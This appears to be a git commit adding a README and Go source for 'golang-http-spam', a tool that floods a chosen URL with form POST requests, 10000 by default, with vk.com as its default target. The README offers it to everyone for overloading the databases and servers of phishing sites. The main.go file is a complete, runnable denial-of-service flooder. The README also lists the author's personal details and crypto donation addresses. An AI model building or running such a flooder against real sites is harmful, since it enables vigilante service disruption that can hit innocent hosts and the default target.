710a0fcf51b9ec0043980f0ad7113a13fcff6747
nikitavoryet <n.vtorushin@smartworld.team>
2021-09-20 16:42:01 +0700

    add support post attack with JSON body. add func getFormatData

--- README.md
+++ README.md
@@ -1,1 +1,58 @@
-# golang-spammer-atack
+# golang-http-spam
+
+Example HTTP SPAM code written in GoLang.
+
+Problem: Our project often has phishing attacks that have to be attacked by a simple HTTP attack to overflow the 
+database/nginx/cache/etc.
+
+The idea of the project is to give a tool to everyone to clean the market from such stupid scammers
+
+## Usage
+    ./main -url string [-method string POST | GET] [-data string JSON] [-count int]
+
+    Usage of ./main:
+    -url string
+          url for attack with http/https (https://example.com/v1/auth)
+    -method string
+          method for attack (POST/GET). def: POST
+    - data string
+          JSON string for body/query to HTTP requst ({"email" : "n.vtorushin@inbox.ru", "test": "test"})
+    - count int
+          count requst for attack. Default: 10000
+
+
+## Setup
+Clone the repository and change the working directory:
+
+    git clone https://github.com/nikitavoryet/golang-http-spam.git
+    cd golang-http-spam
+
+Build and run the program:
+
+    go build -o attack
+    ./attack -url localhost:8080
+
+# In the plans :
+```
+- [ ] GET with query
+- [ ] use go rutina
+- [ ] mass urls attack
+```
+
+```
+Donate:
+
+    BTC:  192TC7d7ZRYJQbQnAWvMpkccnBNQN1ae6R
+    ETH:  0x7d1082d952f4d584ae2910e14018f4dce7495c74
+    LTC:  MLx6wmFjXfBTKj6JfB5NXaiKjNLeEntRoZ
+    DOGE: DHCjW71EWBzvv43XPXVJc491brcBJXXq88
+```
+    author: 
+    
+    Name:          Nikita
+    Company:       SmartWorld
+    Position:      TeamLead
+    Mail:          n.vtorushin@inbox.ru
+    TG:            @nikitavoryet
+    Year of birth: 1999
+    FullStack:     JS/GO
---
+++ main.go
@@ -0,0 +1,114 @@
+/**
+	* hope it helps u 							*
+	* By Nikita Vtorushin<n.vtorushin@inbox.ru> *
+	* @nikitavoryet 							*
+	* GoLang spam atack for scammers			*
+**/
+
+package main
+
+import (
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io/ioutil"
+	"math/rand"
+	"net/http"
+	"net/url"
+	"time"
+)
+
+var completeCount = 0
+var errorCount = 0
+
+type any interface{}
+
+func main() {
+	attackUrl := flag.String("url", "vk.com", "attackUrl spam attack")
+	method := flag.String("method", "POST", "method for attack (POST/GET)")
+	count := flag.Int("count", 10000, "count for attack")
+	_data := flag.String("data", ``, "data for attack")
+	flag.Parse()
+
+	var data url.Values
+
+	if *attackUrl != "" {
+
+		if *_data != "" {
+			_body := getData(*method, *_data)
+			data = _body
+		}
+
+		rand.Seed(time.Now().UnixNano())
+		for i := 0; i < *count; i++ {
+			if i%5 == 0 {
+				fmt.Println("Sended count:", i, "Good:", completeCount, "Bad:", errorCount)
+			}
+			startAttack(*attackUrl, *method, data)
+		}
+		fmt.Println("Done.", "Good: ", completeCount, "Error: ", errorCount)
+	} else {
+		fmt.Println("Set variable -url")
+	}
+}
+
+func startAttack(attackUrl string, method string, data url.Values) bool {
+	resp, err := http.PostForm(attackUrl, data)
+
+	if err != nil {
+		fmt.Println("Site not available: ", attackUrl, "\nERROR:")
+		errorCount++
+	} else {
+		defer resp.Body.Close()
+		body, err := ioutil.ReadAll(resp.Body)
+
+		req := string(body)
+		_ = req
+
+		if err != nil || resp.StatusCode != 200 {
+			if err != nil {
+				log(err)
+			} else {
+				log(req)
+			}
+			errorCount++
+		} else {
+			completeCount++
+		}
+	}
+	return true
+}
+
+func log(data any) {
+	fmt.Println(data)
+}
+
+func getData(method string, data string) url.Values {
+	log(method)
+	if method == "POST" || method == "post" {
+		var body = []byte(data)
+		return getFormatPostData(body)
+	} else {
+		return nil
+	}
+}
+
+/**
+ * Format JSON to url.Values
+ * Example JSON:
+ * {"email": "test@inbox.ru","password": "123test321"}
+ */
+func getFormatPostData(body []byte) url.Values {
+	m := map[string]string{}
+	if err := json.Unmarshal(body, &m); err != nil {
+		panic(err)
+	}
+	_body := url.Values{}
+	for key, val := range m {
+		_body.Add(key, val)
+	}
+
+	return _body
+}
+
+func getFormatGetData() {}
